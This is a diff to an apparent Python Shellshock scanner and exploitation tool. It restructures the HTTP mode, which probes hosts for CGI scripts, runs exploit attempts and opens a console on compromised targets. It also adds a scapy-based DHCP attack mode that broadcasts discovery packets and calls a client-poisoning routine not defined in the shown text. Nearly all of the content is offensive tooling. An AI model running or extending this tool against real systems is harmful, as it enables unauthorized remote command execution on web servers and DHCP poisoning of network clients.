@@ -42,8 +42,9 @@ import Queue
 import threading
 import re
 from collections import OrderedDict
-    
-# Wrapper object for sys.sdout to eliminate buffering
+from scapy.all import *   
+
+# Wrapper object for sys.sdout to (try to) eliminate text buffering
 # (http://stackoverflow.com/questions/107705/python-output-buffering)
 class Unbuffered(object):
     def __init__(self, stream):
@@ -78,6 +79,34 @@ def signal_handler(signal, frame):
     sys.exit(0)
 
 
+###################
+#
+# HTTP/S Attacks
+#
+###################
+
+
+def do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose):
+    """ The main funtion for http (and https) attacks. Accepts arguments passed in from the
+    command line and outputs to the command line.
+    """
+    # Check hosts resolve and are reachable on the chosen port
+    confirmed_hosts = check_hosts(host_target_list, port, verbose)
+
+    # Go through the cgi_list looking for any present on the target host
+    if len(confirmed_hosts) > 0:
+        target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)
+        # If any cgi scripts were found on the target host try to exploit them
+        if len(target_list):
+            successful_targets = do_exploit_cgi(proxy, target_list, header, command, verbose)
+            if len(successful_targets):
+                ask_for_console(proxy, successful_targets, verbose)
+            else:
+                print "[-] All exploit attempts failed"
+        else:
+            print "[+] No targets found to exploit"
+    else:
+        print "[-] No valid hosts provided"
 def check_hosts(host_target_list, port, verbose):
     """ Do some basic sanity checking on hosts to make sure they resolve
     and are currently reachable on the specified port(s)
@@ -95,7 +124,6 @@ def check_hosts(host_target_list, port, verbose):
         # Show a progress bar unless verbose or there is only 1 host 
         if not verbose and number_of_targets > 1: 
             print_progress(number_of_targets, counter) 
-
         try:
             if verbose: print "[I] Checking to see if %s resolves..." % host
             ipaddr = socket.gethostbyname(host)
@@ -113,7 +141,7 @@ def check_hosts(host_target_list, port, verbose):
     if number_of_targets > 1:
         print "[+] %i of %i targets were reachable" % \
                             (len(confirmed_hosts), number_of_targets)
-    else:
+    elif len(confirmed_hosts) > 0:
         print "[+] Target was reachable"
     return confirmed_hosts
 
@@ -384,6 +412,31 @@ def print_progress(
     if percentage_progress == 100: print "\n"
 
 
+###################
+#
+# DHCP Attacks
+#
+###################
+
+
+def do_dhcp_attack():
+    """ The main funtion for DHCP attacks. Accepts arguments passed in from the
+    command line and outputs to the command line.
+    """
+    look_for_dhcp_servers()
+    poison_dhcp_clients()
+
+
+def look_for_dhcp_servers():
+
+    conf.checkIPaddr = False
+    fam,hw = get_if_raw_hwaddr(conf.iface)
+
+    results = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[("message-type","discover")]))
+    answered, unanswered = results
+    print answered[0]
+
+
 def main():
     print """
    .-. .            .            
@@ -408,7 +461,15 @@ def main():
         description='A Shellshock scanner and exploitation tool',
         epilog='Examples of use can be found in the README' 
         )
-    targets = parser.add_mutually_exclusive_group(required=True)
+    parser.add_argument(
+        '--Mode',
+        '-M',
+        choices=['http', 'dhcp'],
+        type = str,
+        default = "http",
+        help = 'Attack mode (default=http)'
+        )
+    targets = parser.add_mutually_exclusive_group()
     targets.add_argument(
         '--Hostname',
         '-H',
@@ -479,52 +540,46 @@ def main():
     args = parser.parse_args()
 
     # Assign options to variables
-    if args.Hostname:
-        host_target_list = [args.Hostname]
-    else:
-        host_target_list = get_targets_from_file(args.file)
-    if not len(host_target_list) > 0:
-        print "[-] No valid targets provided, exiting..."
-        exit (0)
-    port = str(args.port)
-    header = args.header
-    if args.proxy is not None:
-        proxy = args.proxy
-    else:
-        proxy = ""
-    verbose = args.verbose
-    command = args.command
-    if args.ssl == True or port == "443":
-        protocol = "https"
-    else:
-        protocol = "http"
-    global thread_pool
-    if args.threads > 100:
-        print "Maximum number of threads is 100"
-        exit(0) 
-    else:
-        thread_pool = threading.BoundedSemaphore(args.threads)
-    if args.cgi is not None:
-        cgi_list = [args.cgi]
-        print "[+] Single target '%s' being used" % cgi_list[0]
-    else:
-        cgi_list = import_cgi_list_from_file(args.cgilist)
-
-    # Check hosts resolve and are reachable on the chosen port
-    confirmed_hosts = check_hosts(host_target_list, port, verbose)
-
-    # Go through the cgi_list looking for any present on the target host
-    target_list = scan_hosts(protocol, confirmed_hosts, port, cgi_list, proxy, verbose)
-
-    # If any cgi scripts were found on the target host try to exploit them
-    if len(target_list):
-        successful_targets = do_exploit_cgi(proxy, target_list, header, command, verbose)
-        if len(successful_targets):
-            ask_for_console(proxy, successful_targets, verbose)
+    if args.Mode == "dhcp":
+        do_dhcp_attack()
+    elif args.Mode == "http":
+        if args.Hostname:
+            host_target_list = [args.Hostname]
+        elif args.file:
+            host_target_list = get_targets_from_file(args.file)
         else:
-            print "[-] All exploit attempts failed"
+            print "[-] Either a host or a file containing a list of hosts much be provided"
+            exit(0)
+        if not len(host_target_list) > 0:
+            print "[-] No valid targets provided, exiting..."
+            exit (0)
+        port = str(args.port)
+        header = args.header
+        if args.proxy is not None:
+            proxy = args.proxy
+        else:
+            proxy = ""
+        verbose = args.verbose
+        command = args.command
+        if args.ssl == True or port == "443":
+            protocol = "https"
+        else:
+            protocol = "http"
+        global thread_pool
+        if args.threads > 100:
+            print "Maximum number of threads is 100"
+            exit(0) 
+        else:
+            thread_pool = threading.BoundedSemaphore(args.threads)
+        if args.cgi is not None:
+            cgi_list = [args.cgi]
+            print "[+] Single target '%s' being used" % cgi_list[0]
+        else:
+            cgi_list = import_cgi_list_from_file(args.cgilist)
+        do_http_attack(host_target_list, port, protocol, cgi_list, proxy, header, command, verbose)
     else:
-        print "[+] No targets found to exploit"
+        print "Unresognised attack type. Exiting..."
+        exit(0)
 
 __version__ = '0.8'
 if __name__ == '__main__':
